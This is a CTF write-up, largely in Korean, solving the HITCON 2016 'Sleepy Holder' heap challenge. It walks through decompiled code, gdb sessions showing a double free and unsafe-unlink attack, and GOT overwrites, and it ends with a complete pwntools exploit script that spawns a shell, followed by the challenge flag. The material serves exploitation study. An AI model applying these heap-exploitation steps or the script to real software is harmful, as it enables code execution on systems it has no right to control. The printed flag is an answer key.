---
title: "Pwn-Sleepy Holder(300) - Solved by 1 Teams"
sidebar_position: 1
---


## **Information**

### **Description**
```
The Secret Holder has become sleepy and lazy now.  
nc 52.68.31.117 9547  
  
[SleepyHolder](https://s3-ap-northeast-1.amazonaws.com/hitcon2016qual/SleepyHolder_3d90c33bdbf3e5189febfa15b09ca5ee61b94015)  
[libc.so.6](https://s3-ap-northeast-1.amazonaws.com/hitcon2016qual/libc.so.6_375198810bb39e6593a968fcbcf6556789026743)
```
### **Files**

* [SleepyHolder\_3d90c33bdbf3e5189febfa15b09ca5ee61b94015](/attachments/7536654/7537079.bin)
* [libc.so.6\_375198810bb39e6593a968fcbcf6556789026743](/attachments/7536654/7537078.bin)

### **Source Code**

* [SleepyHolder.c](/attachments/7536654/7537080.c)

## **Write Up**

### File information

```sh title="File Information"
autolycos@ubuntu:~/CTF/HITCON2016/SleepyHolder$ file SleepyHolder_3d90c33bdbf3e5189febfa15b09ca5ee61b94015 
SleepyHolder_3d90c33bdbf3e5189febfa15b09ca5ee61b94015: ELF 64-bit LSB  executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=46f0e70abd9460828444d7f0975a8b2f2ddbad46, stripped
autolycos@ubuntu:~/CTF/HITCON2016/SleepyHolder$ checksec.sh --file SleepyHolder_3d90c33bdbf3e5189febfa15b09ca5ee61b94015 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   SleepyHolder_3d90c33bdbf3e5189febfa15b09ca5ee61b94015
autolycos@ubuntu:~/CTF/HITCON2016/SleepyHolder$
```

### Binary analysis

* **해당 문제를 실행하면 다음과 같은 메뉴를 출력합니다.**
  + 1.비밀 유지
  + 2.비밀 지우기
  + 3.비밀 갱신

```sh title="Menu" 
autolycos@ubuntu:~/CTF/HITCON2016/SleepyHolder$ ./SleepyHolder_3d90c33bdbf3e5189febfa15b09ca5ee61b94015 
Waking Sleepy Holder up ...
Hey! Do you have any secret?
I can help you to hold your secrets, and no one will be able to see it :)
1. Keep secret
2. Wipe secret
3. Renew secret
```

#### **Main**

* **해당 문제의 main() 함수 기능은 다음과 같습니다.**
  + "/dev/urandom" 파일에서 읽어온 값에 "4095"를 AND 연산한 값으로 Heap 영역을 할당합니다.
  + 기본적인 메뉴를 출력합니다.

```c title="Main Function"
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  int command; // eax MAPDST
  unsigned int buf; // [rsp+4h] [rbp-1Ch]
  int fd; // [rsp+8h] [rbp-18h]
  char tmp; // [rsp+10h] [rbp-10h]
  unsigned __int64 v8; // [rsp+18h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  setSIGALM();
  puts("Waking Sleepy Holder up ...");
  fd = open("/dev/urandom", 0);
  read(fd, &buf, 4uLL);
  buf &= 4095u;
  malloc(buf);
  sleep(3u);
  puts("Hey! Do you have any secret?");
  puts("I can help you to hold your secrets, and no one will be able to see it :)");
  while ( 1 )
  {
    puts("1. Keep secret");
    puts("2. Wipe secret");
    puts("3. Renew secret");
    memset(&tmp, 0, 4uLL);
    read(0, &tmp, 4uLL);
    command = atoi(&tmp);
    switch ( command )
    {
      case 2:
        WipeSecret();
        break;
      case 3:
        RenewSecret();
        break;
      case 1:
        KeepSecret();
        break;
    }
  }
}
```

#### **KeepSecret**

* **해당 함수는 다음과 같은 기능을 합니다.**
  + 다음과 같이 calloc() 함수를 이용하여 세 가지의 크기의 값을 생성 할 수 있습니다.  
    - Small : 40 byte
    - Big : 4000 byte
    - Huge : 400000 byte
  + **할당된 공간의 주소는 전역 변수에 저장됩니다.**
    - gSmallSecret
    - gBigSecret
    - gHugeSecret
  + **메모리 영역 할당 여부를 전역 변수에 저장합니다.**(set 1)****
    - gSmallSecretFlag
    - gBigSecretFlag
    - gHugeSecretFlag
  + 할당 받은 공간에 read()함수를 이용하여 내용을 입력 받습니다.

```c title="KeepSecret Function"
unsigned __int64 KeepSecret()
{
  int command; // eax
  char tmp; // [rsp+10h] [rbp-10h]
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  puts("What secret do you want to keep?");
  puts("1. Small secret");
  puts("2. Big secret");
  if ( !gHugeSecretFlag )
    puts("3. Keep a huge secret and lock it forever");
  memset(&tmp, 0, 4uLL);
  read(0, &tmp, 4uLL);
  command = atoi(&tmp);
  if ( command == 2 )
  {
    if ( !gBigSecretFlag )
    {
      gBigSecret = calloc(1uLL, 0xFA0uLL);
      gBigSecretFlag = 1;
      puts("Tell me your secret: ");
      read(0, gBigSecret, 0xFA0uLL);
    }
  }
  else if ( command == 3 )
  {
    if ( !gHugeSecretFlag )
    {
      gHugeSecret = calloc(1uLL, 0x61A80uLL);
      gHugeSecretFlag = 1;
      puts("Tell me your secret: ");
      read(0, gHugeSecret, 0x61A80uLL);
    }
  }
  else if ( command == 1 && !gSmallSecretFlag )
  {
    gSmallSecret = calloc(1uLL, 0x28uLL);
    gSmallSecretFlag = 1;
    puts("Tell me your secret: ");
    read(0, gSmallSecret, 0x28uLL);
  }
  return __readfsqword(0x28u) ^ v3;
}
```

#### **WipeSecret**

* **해당 함수는 다음과 같은 기능을 합니다.**  
  + KeepSecret() 함수에서 생성한 메모리 공간을 삭제 합니다.
    - 단 Small, Big Secret의 공간만 삭제가 가능합니다.
    - Huge secret는 삭제할 수 없습니다.
  + 즉, Huge secret는 단 한번만 생성가능하다는 것을 알수 있습니다.
  + 그리고 해제된 크기의 flag 전역 변수에 0을 저장합니다.
* **취약성은 여기서 발생합니다.**
  + 메모리를 해제할 때 전역 변수에 저장한 값을 초기화 하지 않습니다.
  + 메모리 할당과 해제를 반복해 **모든 전역변수에 동일한 주소를 저장 할 수 있습니다.**
* **해당 취약성에 의해 또 다른 취약성이 발생합니다.**
  + 앞에서 설명한 취약점을 이용해 **flag 전역변수의 값을 변경하지 않고 Heap 영역을 해제 할 수 있습니다.**
  + Heap 영역을 해제 할 때 free() 함수에 전달되는 값을 할당 받은 Heap의 주소 값 입니다.

```c title="WipeSecret Function"
unsigned __int64 WipeSecret()
{
  int command; // eax
  char tmp; // [rsp+10h] [rbp-10h]
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  puts("Which Secret do you want to wipe?");
  puts("1. Small secret");
  puts("2. Big secret");
  memset(&tmp, 0, 4uLL);
  read(0, &tmp, 4uLL);
  command = atoi(&tmp);
  if ( command == 1 )
  {
    free(gSmallSecret);
    gSmallSecretFlag = 0;
  }
  else if ( command == 2 )
  {
    free(gBigSecret);
    gBigSecretFlag = 0;
  }
  return __readfsqword(0x28u) ^ v3;
}
```

#### **RenewSecret**

* **해당 함수는 다음과 같은 기능을 합니다.**  
  + KeepSecret() 함수에서 생성한 메모리 공간에 내용을 다시 작성할 수 있습니다.
  + Small, Big Secret의 공간만 내용 변경이 가능합니다.

```c title="RenewSecret Function"
__int64 RenewSecret()
{
  int command; // eax@1
  char input; // [rsp+10h] [rbp-10h]@1
  __int64 v3; // [rsp+18h] [rbp-8h]@1

  v3 = *MK_FP(__FS__, 40LL);
  puts("Which Secret do you want to renew?");
  puts("1. Small secret");
  puts("2. Big secret");
  memset(&input, 0, 4uLL);
  read(0, &input, 4uLL);
  command = atoi(&input);
  if ( command == 1 )
  {
    if ( gSmallSecretState )
    {
      puts("Tell me your secret: ");
      read(0, gSmallSecret, 0x28uLL);
    }
  }
  else if ( command == 2 && gBigSecMsgState )
  {
    puts("Tell me your secret: ");
    read(0, gBigSecMsg, 0xFA0uLL);
  }
  return *MK_FP(__FS__, 40LL) ^ v3;
}
```

### **Debuging**

#### **Heap Overflow**
* **다음과 같은 상황에서 Heap Overflow가 발생합니다.**
  + "Keep secret" → "Small secret"
  + "Keep secret" → "Big secret"
  + "Wipe secret" → "Small secret"
  + "Keep secret" → "Huge secret"
  + "Wipe secret" → "Small secret"
* **Debuging을 통해 원인을 확인해 보겠습니다.**

```sh title="Break point"
gdb-peda$ b *0x400000 + 0x9ff
Breakpoint 1 at 0x4009ff
gdb-peda$ b *0x400000 + 0xa5b
Breakpoint 2 at 0x400a5b
gdb-peda$ b *0x400000 + 0xab1
Breakpoint 3 at 0x400ab1
gdb-peda$ b *0x400000 + 0xb94
Breakpoint 4 at 0x400b94
gdb-peda$ b *0x400000 + 0xbaf
Breakpoint 5 at 0x400baf
gdb-peda$
```

* **아래 내용은 다음과 같은 입력을 처리한 내용입니다.**
  + "Keep secret" → "Small secret"
  + "Keep secret" → "Big secret"
  + "Wipe secret" → "Small secret"
* **디버깅을 통해 다음과 같은 정보를 확인할 수 있습니다.**
  + "gSmallSecret" 전역 변수의 주소는 0x6020d0 이며, 할당 받은 Heap 주소는 0x603bb0 입니다.
  + "gBigSecret" 전역 변수의 주소는 0x6020c0 이며, 할당 받은 Heap 주소는 0x603be0 입니다.
  + "Wipe secret" → "Small secret" 기능으로 "Small secret" 영역이 해제되었지만, 전역변수에 저장된 값을 변경되지 않았습니다.

```sh title=""Wipe secret" → "Small secret""
gdb-peda$ r
Starting program: /home/lazenca0x0/CTF/HITCON/SleepyHolder/SleepyHolder_3d90c33bdbf3e5189febfa15b09ca5ee61b94015 
Waking Sleepy Holder up ...
Hey! Do you have any secret?
I can help you to hold your secrets, and no one will be able to see it :)
1. Keep secret
2. Wipe secret
3. Renew secret
1
What secret do you want to keep?
1. Small secret
2. Big secret
3. Keep a huge secret and lock it forever
1
Breakpoint 1, 0x00000000004009ff in ?? ()
gdb-peda$ x/i $rip
=> 0x4009ff:	mov    QWORD PTR [rip+0x2016ca],rax        # 0x6020d0
gdb-peda$ i r rax
rax            0x603bb0	0x603bb0
gdb-peda$ c
Continuing.

Program received signal SIGALRM, Alarm clock.
Tell me your secret: 
AAAA
1. Keep secret
2. Wipe secret
3. Renew secret
1
What secret do you want to keep?
1. Small secret
2. Big secret
3. Keep a huge secret and lock it forever
2
Breakpoint 2, 0x0000000000400a5b in ?? ()
gdb-peda$ x/i $rip
=> 0x400a5b:	mov    QWORD PTR [rip+0x20165e],rax        # 0x6020c0
gdb-peda$ i r rax
rax            0x603be0	0x603be0
gdb-peda$ c
Continuing.
Tell me your secret: 
BBBB
1. Keep secret
2. Wipe secret
3. Renew secret
2
Which Secret do you want to wipe?
1. Small secret
2. Big secret
1
Breakpoint 4, 0x0000000000400b94 in ?? ()
gdb-peda$ x/gx 0x6020d0
0x6020d0:	0x0000000000603bb0
gdb-peda$ x/gx 0x6020c0
0x6020c0:	0x0000000000603be0
gdb-peda$
```

* **"Keep secret" → "Huge secret" 기능을 호출하여 해제된 "Small secret" 영역이 "Small bin"영역에 등록됩니다.**
  + 초기에 확보한 Heap 공간이 프로그램에서 요청한 크기보다 작기 때문에 malloc() 함수는 새로운 Heap 공간을 확보합니다.
  + malloc()함수는 새로 확보된 공간에 프로그램이 요청한 크기의 heap 영역을 할당합니다.
  + 그리고 "Small secret" 영역은 "Small bin"영역에 등록되며, 해당 Heap의 헤더의 fd, bk영역에 main\_arena 영역의 주소가 저장됩니다.
    - fd : 0x00007ffff7dd1b98
    - bk : 0x00007ffff7dd1b98
* "gHugeSecret" 전역 변수의 주소는 0x6020c8 이며, 할당 받은 Heap 주소는 0x7ffff7f73010 입니다.

```sh title=""Keep secret" → "Huge secret"""
gdb-peda$ c
Continuing.
1. Keep secret
2. Wipe secret
3. Renew secret
1
What secret do you want to keep?
1. Small secret
2. Big secret
3. Keep a huge secret and lock it forever
3

Breakpoint 3, 0x0000000000400ab1 in ?? ()
gdb-peda$ x/i $rip
=> 0x400ab1:	mov    QWORD PTR [rip+0x201610],rax        # 0x6020c8
gdb-peda$ i r rax
rax            0x7ffff7f73010	0x7ffff7f73010
gdb-peda$ p main_arena.system_mem 
$1 = 0x21000
gdb-peda$ p main_arena.max_system_mem 
$2 = 0x21000
gdb-peda$ p main_arena.bins[4]
$3 = (mchunkptr) 0x603ba0
gdb-peda$ p main_arena.bins[5]
$4 = (mchunkptr) 0x603ba0
gdb-peda$ x/4gx 0x603ba0
0x603ba0:	0x0000000000000000	0x0000000000000031
0x603bb0:	0x00007ffff7dd1b98	0x00007ffff7dd1b98
gdb-peda$
```

* **다음과 같은 방법으로 "Unsafe unlink" 공격을 진행 할 수 있습니다.**
  + "Unsafe unlink" 공격을 위해 Allocated chunk의 size 영역에서 PREV\_INUSE 값을 제거해야 합니다.
    - 하지만 해당 영역을 Overflow 할 수 없습니다. "Small secret" 공간을 해제(Double free) 하여 PREV\_INUSE 값을 제거합니다.
    - "Wipe secret" → "Small secret"기능을 호출하면, 해제된 "Small secret" 공간을 해제(Double free)해 fastbin에 등록합니다.
  + "Keep secret" → "Small secret"기능을 호출하여, "Big secret"이 사용하는 chunk의 size값에 PREV\_INUSE 값이 추가 되지 않고  해제된 "Small secret" 영역을 재할당 받습니다.
    - fastbin에 등록된 주소는 제거되지만, smallbin에 등록된 주소는 제거 되지 않습니다.
  + 입력을 통해 "Small secret"영역에 Fake chunk를 저장합니다.

```sh title="Remove \"prev_size\""
gdb-peda$ p main_arena.bins[4]
$5 = (mchunkptr) 0x603ba0
gdb-peda$ p main_arena.bins[5]
$6 = (mchunkptr) 0x603ba0
gdb-peda$ p main_arena.fastbinsY 
$7 = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}
gdb-peda$ c
Continuing.

Tell me your secret: 
CCCC
1. Keep secret
2. Wipe secret
3. Renew secret
2
Which Secret do you want to wipe?
1. Small secret
2. Big secret
1

Breakpoint 4, 0x0000000000400b94 in ?? ()
gdb-peda$ p main_arena.bins[4]
$8 = (mchunkptr) 0x603ba0
gdb-peda$ p main_arena.bins[5]
$9 = (mchunkptr) 0x603ba0
gdb-peda$ p main_arena.fastbinsY 
$10 = {0x0, 0x603ba0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}
gdb-peda$ c
Continuing.
1. Keep secret
2. Wipe secret
3. Renew secret
1
What secret do you want to keep?
1. Small secret
2. Big secret
1

Breakpoint 1, 0x00000000004009ff in ?? ()
gdb-peda$ p main_arena.bins[4]
$11 = (mchunkptr) 0x603ba0
gdb-peda$ p main_arena.bins[5]
$12 = (mchunkptr) 0x603ba0
gdb-peda$ p main_arena.fastbinsY 
$13 = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}
gdb-peda$ x/6gx 0x603bb0
0x603bb0:	0x0000000000000000	0x0000000000000000
0x603bc0:	0x0000000000000000	0x0000000000000000
0x603bd0:	0x0000000000000000	0x0000000000000fb0
gdb-peda$
```

* **다음과 같이 Fake chunk를 저장합니다.**
  + 사용자를 입력 값을 통해 Fake chunk와 Allocated chunk의 prev\_size값을 저장 할 수 있습니다.

```sh title="Unsafe unlink"
gdb-peda$ c
Continuing.
Tell me your secret: 
AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEE
1. Keep secret
2. Wipe secret
3. Renew secret
1. Keep secret
2. Wipe secret
3. Renew secret
^C
Program received signal SIGINT, Interrupt.

0x00007ffff7b04230 in __read_nocancel () at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.
gdb-peda$ x/6gx 0x603bb0
0x603bb0:	0x4141414141414141	0x4242424242424242
0x603bc0:	0x4343434343434343	0x4444444444444444
0x603bd0:	0x4545454545454545	0x0000000000000fb0
gdb-peda$ set *0x603bb0 = 0x0
gdb-peda$ set *0x603bb4 = 0x0
gdb-peda$ set *0x603bb8 = 0x0
gdb-peda$ set *0x603bbc = 0x0
gdb-peda$ set *0x603bc0 = 0x6020d0 - 0x18
gdb-peda$ set *0x603bc4 = 0x0
gdb-peda$ set *0x603bc8 = 0x6020d0 - 0x10
gdb-peda$ set *0x603bcc = 0x0
gdb-peda$ set *0x603bd0 = 0x20
gdb-peda$ set *0x603bd4 = 0x0
gdb-peda$ x/6gx 0x603bb0
0x603bb0:	0x0000000000000000	0x0000000000000000
0x603bc0:	0x00000000006020b8	0x00000000006020c0
0x603bd0:	0x0000000000000020	0x0000000000000fb0
gdb-peda$ x/gx 0x6020d0
0x6020d0:	0x0000000000603bb0
gdb-peda$
```

* **다음과 같은 Fake chunk 구조는 다음과 같습니다.**

:::note[Fake chunk]
| addresss | 0x0 | 0x8 |
| --- | --- | --- |
| 0x603bb0 | 0x0 | 0x0 |
| 0x603bc0 | fb(0x6020d0 - 0x18) | bk(0x6020d0 - 0x10) |
| 0x603bd0 | prev\_size(0x20) | size(0xfb0) |
:::

* **"Unsafe unlink" 기법에 의해 "gSmallSecret"(0x6020d0) 전역 변수에 ".bss" 영역(**0x6020d0 - 0x18)의 주소 값이 저장됩니다.**

```sh title="The value of the "gSmallSecret" area has changed."
gdb-peda$ c
Continuing.
2
Which Secret do you want to wipe?
1. Small secret
2. Big secret
2

Breakpoint 5, 0x0000000000400baf in ?? ()
gdb-peda$ x/gx 0x6020d0
0x6020d0:	0x00000000006020b8
gdb-peda$
```

:::note[Detailed explanation of the Unsafe unlink]
* [unsafe unlink](https://www.lazenca.net/display/TEC/unsafe+unlink)
:::

### Structure of Exploit code

* Payload의 순서는 다음과 같습니다.

:::note[Payload 순서]
1. Unsafe unlink(전역 변수)
2. Leak Heap Addresss
3. offset 추출
4. Overflow(system)
:::

* 이를 조금더 자세하게 설명하면 다음과 같습니다.

:::note[상세 설명]
1. Unsafe unlink(전역 변수)
   1. "gSmallSecret" 전역 변수의 주소값 변경
2. Leak Heap Addresss
   1. ""gBigSecret"" 변수의 주소값 .got.plt 주소 값으로 변경
   2. .got.plt "\_free" 영역의 값을 .plt \_puts 주소값 저장
   3. "WipeSecret" → "BigSecret"
3. offset 추출
   1. System()
4. Overflow(system)
   1. .got.plt "\_free" 영역의 값을 \_\_libc\_system 주소값 저장
   2. "Keep secret" → "BigSecret"
   3. "WipeSecret" → "BigSecret"
:::  

* payload를 바탕으로 공격을 위해 알아내어야 할 정보는 다음과 같습니다.

:::note[확인해야 할 정보 목록]
* Leak libc addresss
:::

### **Information for attack**

#### **Leak libc addresss**

* **공격을 위해 필요한 libc addresss는 다음과 같은 방법으로 획득 할 수 있습니다.**
  + unsafe unlink 취약성을 이용하여 "gSmallSecret" 변수에 0x6020b8(.bss 영역)을 저장하였습니다.
  + 공격자는 "gSmallSecret" 변수를 이용해 전역 변수에 저장된 값들을 변경할 수 있습니다.
  - 전역 변수는 0x6020C0 ~ 0x6020E0 영역을 사용
* **"Renew secret" 기능을 이용해 "Small secret"을 선택하여 전역 변수들의 값을 변경할 수 있습니다.**
  + 해당 취약성을 이용해 got, plt의 값을 변경해 필요한 주소 값을 추출하고, shell을 실행 할 수 있습니다.

```sh title="Overwrite to global variable"
gdb-peda$ b *0x400C86
gdb-peda$ c
Continuing.
3
Which Secret do you want to renew?
1. Small secret
2. Big secret
1
Tell me your secret:
AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEE

Breakpoint 5, 0x0000000000400c86 in ?? ()
gdb-peda$ x/6gx 0x00000000006020b8
0x6020b8:	0x4141414141414141	0x4242424242424242
0x6020c8:	0x4343434343434343	0x4444444444444444
0x6020d8:	0x4545454545454545	0x0000000000000001
gdb-peda$
```

* **다음과 같은 방법으로 기본 주소를 계산 할 수 있는 libc addresss를 추출 할 수 있습니다.**
  + 주소 값 추출을 위해 free()함수의 got 영역을 공격 대상으로 합니다.
  + "Renew secret" → "Small secret"의 기능을 이용해 전역 변수의 값을 아래와 같이 변경 할 수 있습니다.
    - gBigSecret    [0x6020c0] : atoi() 함수의 got 주소
    - gHugeSecret [0x6020c8] : puts() 함수의 got 주소
    - gSmallSecret [0x6020d0] :  free() 함수의 got 주소
  + "Renew secret" → "Small secret"의 기능을 이용해 free() 함수의 got 영역의 값을 변경 할 수 있습니다.
    - free() 함수의 plt 값을 puts() 함수의 plt주소로 변경합니다.
  + "Wipe secret" 기능을 이용해 "Big secret"의 삭제를 요청하면 변경된 free() 함수의 got에 의해 puts() 함수가 호출됩니다.
    - "Big secret"을 선택하였기 때문에 "gBigSecret"에 저장된 atoi() 함수의 got 주소가 출력됩니다.

### **Exploit Code**

```python title="Exploit Code"
from pwn import *
#context.log_level = 'debug'

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def KeepSecret(size,content):
    p.recvuntil('3. Renew secret\n')
    p.sendline('1')
    p.recvuntil('2. Big secret\n')
    p.sendline(str(size));
    p.recvuntil('Tell me your secret: ')
    p.send(content)

def WipeSecret(size):
    p.recvuntil('3. Renew secret\n')
    p.sendline('2')
    p.recvuntil('2. Big secret\n')
    p.sendline(str(size))

def RenewSecret(size,content):
    p.recvuntil('3. Renew secret\n')
    p.sendline('3')
    p.recvuntil('2. Big secret\n')
    p.sendline(str(size))
    p.recvuntil('Tell me your secret: ')
    p.send(content)

gSmallSecret = 0x6020D0

p = process('SleepyHolder_3d90c33bdbf3e5189febfa15b09ca5ee61b94015')
bin = ELF('SleepyHolder_3d90c33bdbf3e5189febfa15b09ca5ee61b94015')

#Remove "prev_size"
KeepSecret(1,'AAAA')
KeepSecret(2,'BBBB')
WipeSecret(1)
KeepSecret(3,'CCCC')
WipeSecret(1)

#Unsafe unlink
secret = p64(0) 
secret += p64(0) 
secret += p64(gSmallSecret - 0x18)
secret += p64(gSmallSecret - 0x10)
secret += p64(0x20)
KeepSecret(1,secret)
WipeSecret(2)

#Overwrite to global variable
secret = p64(0)					#[0x6020b8]
secret += p64(bin.got['atoi'])	#gBigSecret[0x6020c0]
secret += p64(bin.got['puts'])  #gHugeSecret[0x6020c8]
secret += p64(bin.got['free'])  #gSmallSecret[0x6020d0]
secret += p64(1) * 3			#gBigSecretFlag[0x6020d8],gHugeSecretFlag[0x6020dc],gSmallSecretFlag[0x6020e0],...
RenewSecret(1,secret)

#Leak libc
RenewSecret(1,p64(bin.plt['puts']))				#bin.got['free']:bin.plt['free'] -> bin.plt['puts']
WipeSecret(2)									#puts(atoi() got)
libcAddr = u64(p.recv(6).ljust(8,'\x00'))
libc.addresss += libcAddr - libc.symbols['atoi']
systemAddr = libc.symbols['system']

log.info("Libc Addresss : " + hex(libc.addresss))
log.info("System : " + hex(systemAddr))

#Overwrite
RenewSecret(1,p64(systemAddr))					#bin.got['free']:bin.plt['puts'] -> addresss of system()
KeepSecret(2,'sh\0')							#save 'sh'character in the Bigsecret area
WipeSecret(2)									#system('sh')

p.interactive()
```

```c title="SYNOPSIS"
#include <stdlib.h> 
int system(const char *command);
```

## **Flag**

|  |  |
| --- | --- |
| Flag | flag is: hitcon&#123;The Huuuuuuuuuuuge Secret Really MALLOC a difference!&#125; |

## **Related Site**

* <https://github.com/mehQQ/public_writeup/tree/master/hitcon2016/SleepyHolder>